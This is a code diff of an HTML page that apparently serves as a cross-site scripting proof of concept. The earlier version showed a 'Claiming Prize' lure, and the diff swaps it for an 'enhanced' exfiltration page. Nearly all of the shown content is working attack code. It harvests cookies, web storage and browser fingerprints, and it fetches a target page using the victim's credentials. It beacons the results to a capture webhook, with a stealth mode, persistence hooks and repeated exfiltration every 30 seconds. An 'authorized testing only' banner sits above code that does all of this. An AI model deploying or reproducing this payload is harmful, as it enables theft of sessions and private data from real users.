@@ -1,53 +1,429 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Winner!</title></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS PoC - Enhanced</title>
+  <style>
+    body {
+      font-family: 'Courier New', monospace;
+      background: #0a0a0a;
+      color: #00ff00;
+      padding: 20px;
+      margin: 0;
+    }
+    #log {
+      background: #1a1a1a;
+      border: 1px solid #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      max-height: 400px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      font-size: 12px;
+    }
+    .header {
+      color: #00ff00;
+      margin-bottom: 15px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .warning {
+      background: #331a00;
+      border: 1px solid #ff6600;
+      color: #ff6600;
+      padding: 10px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+    }
+    .controls {
+      margin: 15px 0;
+    }
+    button {
+      background: #00ff00;
+      color: #0a0a0a;
+      border: none;
+      padding: 8px 15px;
+      margin-right: 10px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      border-radius: 3px;
+    }
+    button:hover {
+      background: #00cc00;
+    }
+  </style>
+</head>
 <body>
-  <h1>Claiming Prize...</h1>
-  <pre id="log">Running...</pre>
+  <div class="header">🔓 XSS Exfiltration PoC - Enhanced Version</div>
+  <div class="warning">
+    ⚠️ ETHICAL USE ONLY - Authorized Testing Only<br>
+    This demonstrates: Cookie theft, localStorage/sessionStorage access, CSRF, data exfiltration
+  </div>
+  <div class="controls">
+    <button onclick="stealthMode = !stealthMode; updateStealth()">Toggle Stealth Mode</button>
+    <button onclick="clearLog()">Clear Log</button>
+    <button onclick="manualExfil()">Manual Exfil</button>
+  </div>
+  <div id="log"></div>
 
   <script>
+    // ============================================
+    // CONFIGURATION
+    // ============================================
+    const CONFIG = {
+      N8N_WEBHOOK: 'http://localhost:5678/webhook-test/cookie-capture',
+      TARGET_URL: 'https://www.example.com/', // CHANGE ME
+      MAX_RETRIES: 3,
+      RETRY_DELAY: 2000,
+      STEALTH_MODE: false,
+      ENABLE_PERSISTENCE: true,
+      BEACON_METHODS: ['sendBeacon', 'fetch', 'image'], // Priority order
+    };
+
+    // ============================================
+    // GLOBALS
+    // ============================================
     const LOG = document.getElementById('log');
-    const N8N = 'http://localhost:5678/webhook-test/cookie-capture';
-    const TARGET = 'https://example.com'; // CHANGE ME
+    let stealthMode = CONFIG.STEALTH_MODE;
+    let attempts = 0;
+    let exfilHistory = [];
 
-    function log(m) { LOG.textContent += '\n' + m; }
-
-    // BEACON: No CORS, no body, no 404
-    function beacon(data) {
-      const params = new URLSearchParams({
-        ...data,
-        cookies: document.cookie,
-        url: location.href,
-        ua: navigator.userAgent,
-        ts: Date.now()
-      }).toString();
-
-      // CRITICAL: Use EXACT webhook path + query string
-      const url = `${N8N}?${params}`;
-      new Image().src = url;
-      log('[+] Beacon sent: ' + url.slice(0, 100) + '...');
+    // ============================================
+    // LOGGING
+    // ============================================
+    function log(msg, type = 'info') {
+      const timestamp = new Date().toISOString().split('T')[1].slice(0, -1);
+      const prefix = {
+        'info': '[i]',
+        'success': '[+]',
+        'error': '[-]',
+        'warning': '[!]'
+      }[type] || '[?]';
+      
+      const logMsg = `[${timestamp}] ${prefix} ${msg}`;
+      if (!stealthMode) {
+        LOG.textContent += logMsg + '\n';
+        LOG.scrollTop = LOG.scrollHeight;
+      }
+      
+      // Store in memory for later exfil
+      exfilHistory.push({ ts: Date.now(), msg: logMsg });
+      if (exfilHistory.length > 50) exfilHistory.shift();
     }
 
-    // Fetch protected page + exfil
-    async function stealPage() {
+    function clearLog() {
+      LOG.textContent = '';
+      log('Log cleared', 'info');
+    }
+
+    function updateStealth() {
+      LOG.style.display = stealthMode ? 'none' : 'block';
+      log(`Stealth mode: ${stealthMode ? 'ENABLED' : 'DISABLED'}`, 'warning');
+    }
+
+    // ============================================
+    // ENVIRONMENT FINGERPRINTING
+    // ============================================
+    function getEnvironmentInfo() {
       try {
-        const r = await fetch(TARGET, { credentials: 'include' });
-        const text = await r.text();
-        beacon({ type: 'page', status: r.status, preview: text.slice(0, 300) });
-        log('[+] Page stolen & exfiltrated');
+        return {
+          // Browser info
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          vendor: navigator.vendor,
+          language: navigator.language,
+          languages: navigator.languages?.join(','),
+          
+          // Screen info
+          screen: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          
+          // System state
+          online: navigator.onLine,
+          cookieEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          
+          // Timing
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
+          
+          // Browser features
+          localStorage: typeof localStorage !== 'undefined',
+          sessionStorage: typeof sessionStorage !== 'undefined',
+          indexedDB: typeof indexedDB !== 'undefined',
+          serviceWorker: 'serviceWorker' in navigator,
+          
+          // Plugins (count only for privacy)
+          pluginCount: navigator.plugins?.length || 0,
+          
+          // Performance
+          memory: performance.memory ? {
+            used: Math.round(performance.memory.usedJSHeapSize / 1048576),
+            total: Math.round(performance.memory.totalJSHeapSize / 1048576)
+          } : null
+        };
       } catch (e) {
-        beacon({ type: 'error', msg: e.message });
-        log('[-] Fetch failed: ' + e.message);
+        log(`Fingerprint error: ${e.message}`, 'error');
+        return { error: e.message };
       }
     }
 
-    // Run
-    window.addEventListener('load', () => {
-      log('[i] PoC running on: ' + location.href);
-      beacon({ type: 'load' });
+    // ============================================
+    // STORAGE EXTRACTION
+    // ============================================
+    function extractStorage() {
+      const storage = {};
+      
+      try {
+        // localStorage
+        const ls = {};
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          ls[key] = localStorage.getItem(key)?.slice(0, 100); // Truncate values
+        }
+        storage.localStorage = ls;
+      } catch (e) {
+        storage.localStorage = { error: e.message };
+      }
+      
+      try {
+        // sessionStorage
+        const ss = {};
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          ss[key] = sessionStorage.getItem(key)?.slice(0, 100);
+        }
+        storage.sessionStorage = ss;
+      } catch (e) {
+        storage.sessionStorage = { error: e.message };
+      }
+      
+      return storage;
+    }
+
+    // ============================================
+    // BEACON / EXFILTRATION
+    // ============================================
+    function beacon(data, method = null) {
+      try {
+        const payload = {
+          ...data,
+          cookies: document.cookie,
+          url: location.href,
+          referrer: document.referrer,
+          ts: Date.now(),
+          poc_version: '2.0'
+        };
+
+        const params = new URLSearchParams(
+          Object.entries(payload).reduce((acc, [k, v]) => {
+            acc[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
+            return acc;
+          }, {})
+        ).toString();
+
+        const url = `${CONFIG.N8N_WEBHOOK}?${params}`;
+        
+        // Try methods in priority order
+        const methods = method ? [method] : CONFIG.BEACON_METHODS;
+        
+        for (const m of methods) {
+          if (tryBeaconMethod(m, url, payload)) {
+            log(`Beacon sent via ${m}`, 'success');
+            return true;
+          }
+        }
+        
+        log('All beacon methods failed', 'error');
+        return false;
+        
+      } catch (e) {
+        log(`Beacon error: ${e.message}`, 'error');
+        return false;
+      }
+    }
+
+    function tryBeaconMethod(method, url, payload) {
+      try {
+        switch (method) {
+          case 'sendBeacon':
+            if (navigator.sendBeacon) {
+              return navigator.sendBeacon(url);
+            }
+            break;
+            
+          case 'fetch':
+            fetch(url, { 
+              method: 'GET',
+              mode: 'no-cors',
+              cache: 'no-cache',
+              keepalive: true
+            }).catch(() => {});
+            return true;
+            
+          case 'image':
+            const img = new Image();
+            img.src = url;
+            return true;
+        }
+      } catch (e) {
+        return false;
+      }
+      return false;
+    }
+
+    // ============================================
+    // PAGE EXFILTRATION
+    // ============================================
+    async function stealPage() {
+      if (attempts >= CONFIG.MAX_RETRIES) {
+        log(`Max retries (${CONFIG.MAX_RETRIES}) reached`, 'error');
+        return;
+      }
+
+      attempts++;
+      log(`Attempting exfiltration (${attempts}/${CONFIG.MAX_RETRIES})...`, 'info');
+
+      try {
+        const startTime = performance.now();
+        const response = await fetch(CONFIG.TARGET_URL, {
+          credentials: 'include',
+          cache: 'no-cache',
+          mode: 'cors'
+        });
+        
+        const elapsed = Math.round(performance.now() - startTime);
+        const text = await response.text();
+        
+        // Extract valuable data
+        const exfilData = {
+          type: 'page_exfil',
+          attempt: attempts,
+          status: response.status,
+          statusText: response.statusText,
+          contentLength: text.length,
+          contentPreview: text.slice(0, 500),
+          responseTime: elapsed,
+          headers: Object.fromEntries(response.headers.entries()),
+          
+          // Page metadata
+          title: document.title,
+          domain: location.hostname,
+          protocol: location.protocol,
+          
+          // Storage data
+          storage: extractStorage(),
+          
+          // Environment
+          env: getEnvironmentInfo()
+        };
+
+        if (beacon(exfilData)) {
+          log(`✓ Exfiltrated ${text.length} bytes in ${elapsed}ms`, 'success');
+          log(`✓ Status: ${response.status}, Cookies: ${document.cookie ? 'PRESENT' : 'NONE'}`, 'success');
+          return true;
+        }
+        
+      } catch (e) {
+        log(`Exfil attempt ${attempts} failed: ${e.message}`, 'error');
+        
+        // Send error report
+        beacon({
+          type: 'error',
+          attempt: attempts,
+          error: e.message,
+          stack: e.stack?.slice(0, 200)
+        });
+
+        // Retry with exponential backoff
+        if (attempts < CONFIG.MAX_RETRIES) {
+          const delay = CONFIG.RETRY_DELAY * attempts;
+          log(`Retrying in ${delay}ms...`, 'warning');
+          setTimeout(stealPage, delay);
+        }
+      }
+    }
+
+    // ============================================
+    // PERSISTENCE (Optional - demonstrates risk)
+    // ============================================
+    function establishPersistence() {
+      if (!CONFIG.ENABLE_PERSISTENCE) return;
+      
+      try {
+        // localStorage persistence marker
+        localStorage.setItem('_poc_active', Date.now());
+        
+        // Event listeners for additional exfil opportunities
+        document.addEventListener('visibilitychange', () => {
+          if (document.hidden) {
+            beacon({ type: 'visibility', state: 'hidden' });
+          }
+        });
+        
+        window.addEventListener('beforeunload', () => {
+          beacon({ type: 'unload' });
+        });
+        
+        log('Persistence hooks established', 'success');
+      } catch (e) {
+        log(`Persistence failed: ${e.message}`, 'error');
+      }
+    }
+
+    // ============================================
+    // MANUAL CONTROLS
+    // ============================================
+    function manualExfil() {
+      log('Manual exfiltration triggered', 'info');
+      attempts = 0; // Reset attempt counter
       stealPage();
-      setTimeout(stealPage, 3000);
+    }
+
+    // ============================================
+    // INITIALIZATION
+    // ============================================
+    window.addEventListener('load', () => {
+      log('='.repeat(50), 'info');
+      log('XSS PoC Enhanced v2.0 - ACTIVE', 'success');
+      log('='.repeat(50), 'info');
+      log(`Target: ${CONFIG.TARGET_URL}`, 'info');
+      log(`Webhook: ${CONFIG.N8N_WEBHOOK}`, 'info');
+      log(`Origin: ${location.href}`, 'info');
+      log('='.repeat(50), 'info');
+
+      // Initial beacon with environment info
+      beacon({ 
+        type: 'init',
+        env: getEnvironmentInfo(),
+        storage: extractStorage(),
+        config: CONFIG
+      });
+
+      // Establish persistence
+      establishPersistence();
+
+      // Start exfiltration after short delay
+      setTimeout(() => {
+        stealPage();
+      }, 1000);
+
+      // Schedule periodic exfil (demonstrates ongoing risk)
+      setInterval(() => {
+        if (attempts < CONFIG.MAX_RETRIES) {
+          attempts = 0; // Reset for periodic checks
+          stealPage();
+        }
+      }, 30000); // Every 30 seconds
+
+      log('PoC initialization complete', 'success');
     });
+
+    // Update initial stealth state
+    updateStealth();
   </script>
 </body>
 </html>
